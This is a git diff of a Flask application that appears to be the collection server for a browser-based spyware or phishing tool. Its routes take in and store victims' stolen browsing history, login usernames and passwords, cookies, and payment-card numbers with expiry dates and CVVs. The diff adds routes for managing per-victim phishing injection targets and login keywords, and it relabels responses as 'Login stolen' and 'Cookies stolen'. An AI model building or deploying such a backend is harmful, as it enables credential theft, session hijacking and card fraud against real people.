@@ -4,7 +4,7 @@ from flask import Flask, render_template, request, redirect, url_for, jsonify
 # Initial Database Dos
 import general_db
 
-from pyfiles import users, login, secure, history, cookies, victim
+from pyfiles import users, login, secure, history, cookies, victim, phish
 
 app = Flask(__name__)
 
@@ -20,21 +20,27 @@ def index():
         s[str(u)] = secure.getFromSecure(u)
         r[str(u)] = secure.getFromRandom(u)
         v[str(u)] = victim.getFromVictim(u)
-    return render_template("index.html", users = usrs, secure_urls = s, random_urls = r, victim_urls = v)
+    # return render_template("index.html", users = usrs, secure_urls = s, random_urls = r, victim_urls = v)
+    login_kws = login.get_login_kw()
+    return render_template("index.html", users = usrs, login_kws = login_kws, secure_urls = s)
 
 @app.route('/online_check', methods=['POST'])
 def online_check(): 
     if request.method == 'POST':
         email = request.form['email']
         users.update_user(email)
-        return "thanks for pinging!"
+        return "Pinged server!"
 
 @app.route("/view_user/<email>", methods=['GET'])
 def view_user(email):
     hist = history.get_history_by_user(email)
     cook = cookies.get_cookies_by_user(email)
     logs = login.get_logins_by_user(email)
-    return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs)
+    secure_urls = secure.getFromSecure(email)
+    random_urls = secure.getFromRandom(email)
+    phish_urls = phish.get_phish_by_user(email)
+
+    return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs, secure_urls = secure_urls, random_urls = random_urls, phish_urls = phish_urls)
 
 ########### SECURE ###########
 @app.route('/addSecure/<email>', methods=['POST'])
@@ -42,13 +48,13 @@ def add_secure(email):
     if request.method == 'POST':
         url = request.form['url']
         secure.addToSecure(email, url)  
-        return redirect(url_for('index'))
+        return redirect(url_for('view_user', email=email))
 
 @app.route('/deleteSecure/<email>/<url>', methods=['POST'])
 def delete_secure(email, url):
     if request.method == 'POST':
         secure.removeFromSecure(email, url)
-        return redirect(url_for('index'))
+        return redirect(url_for('view_user', email=email))
 
 @app.route('/get_secure/<email>', methods=['GET'])
 def get_secure(email):
@@ -60,13 +66,13 @@ def add_random(email):
     if request.method == 'POST':
         url = request.form['url']
         secure.addToRandom(email, url)
-        return redirect(url_for('index'))
+        return redirect(url_for('view_user', email=email))
 
 @app.route('/deleteRandom/<email>/<url>', methods=['POST'])
 def delete_random(email, url):
     if request.method == 'POST':
         secure.removeFromRandom(email, url)
-        return redirect(url_for('index'))
+        return redirect(url_for('view_user', email=email))
 
 @app.route('/get_random/<email>', methods=['GET'])
 def get_random(email):
@@ -92,6 +98,7 @@ def get_victim(email):
     return jsonify(r=victim.getFromVictim(email))
 
 
+########## History #########
 @app.route("/steal_history", methods=['POST'])
 def steal_history():
     email = request.form['email']
@@ -100,8 +107,9 @@ def steal_history():
     urls = request.form.getlist('urls[]')
     last_visited = request.form.getlist('last_visits[]')
     history.bulk_add_to_history(email, urls, last_visited)
-    return "hi"
+    return "History Stolen"
 
+######### Login ###########
 @app.route("/steal_login", methods=['POST'])
 def steal_login():
     if request.method == 'POST':
@@ -112,9 +120,29 @@ def steal_login():
         username = request.form['username']
         password = request.form['password']
         login.add_to_login(email, url, username, password)
-        return "we all good here"
+        return "Login stolen"
 
+@app.route("/login_kw/add", methods=['POST'])
+def add_to_login_kw():
+    if request.method == 'POST':
+        word = request.form["word"]
+        if len(word) != 0:
+            login.add_login_kw(word)
+        return redirect(url_for('index'))
 
+@app.route("/login_kw/delete/<word>", methods=['POST'])
+def remove_login_kw(word):
+    if request.method == 'POST':
+        login.delete_login_kw(word)
+        return redirect(url_for('index'))
+
+@app.route("/get_login_kw", methods=['GET'])
+def get_all_login_kws():
+    if request.method == 'GET':
+        kws = login.get_login_kw()
+        return jsonify(keywords = kws)
+
+######## Cookies #############
 @app.route("/steal_cookies", methods=['POST'])
 def steal_cookies():
     if request.method == 'POST':
@@ -124,7 +152,46 @@ def steal_cookies():
         url = request.form['url']
         cookie = request.form['cookies']
         cookies.bulk_add_to_cookies(email, url, cookie)
-        return "WHATS UP dawg?"
+        return "Cookies stolen"
+
+######## Phishing ##########
+@app.route("/phish/<email>", methods=['GET', 'POST'])
+def phishy(email): 
+    if request.method == 'GET': 
+        return redirect(url_for('view_user', email=email))
+
+@app.route("/phish/<email>/<url>")
+def phish_code(email, url):
+    if request.method == 'GET':
+        return jsonify(code=phish.get_phish_code(email, url))
+
+@app.route("/phish", methods=['POST'])
+def phishy_info():
+    if request.method == 'POST':
+        email = request.form['email']
+        name = request.form['name-on-card']
+        number = request.form['card-number']
+        month = request.form['expiration-month']
+        year = request.form['expiration-year']
+        cvv = request.form['cvv']
+        phish.add_phish(email, name, number, month, year, cvv)
+        redirect_url = request.form['redirect-url']
+        return redirect(redirect_url)
+
+@app.route("/delete_phish/<email>/<url>", methods=['POST'])
+def delete_phish(email, url):
+    if request.method == 'POST':
+        phish.remove_phish_url(email, url)
+        return redirect(url_for('view_user', email=email))
+
+@app.route("/add_phish/<email>", methods=['POST'])
+def add_phish(email):
+    if request.method == 'POST':
+        url = request.form['url']
+        injectLoc = request.form['inject-loc']
+        injectClass = request.form['inject-class']
+        phish.add_phish_url(email, url, injectLoc, injectClass)
+        return redirect(url_for('view_user', email=email))
 
 @app.route("/execute_script/<email>", methods=['GET', 'POST'])
 def execute_script(email):
@@ -160,6 +227,9 @@ if __name__ == "__main__":
     general_db.create_all_tables()
 
     # uncomment this time if you want to erase the data
-    general_db.delete_db()
+    # general_db.delete_db()
+
+    # uncomment this if you want to add default values 
+    general_db.insert_default_values()
 
     app.run(host='0.0.0.0', port=5000, debug=True)
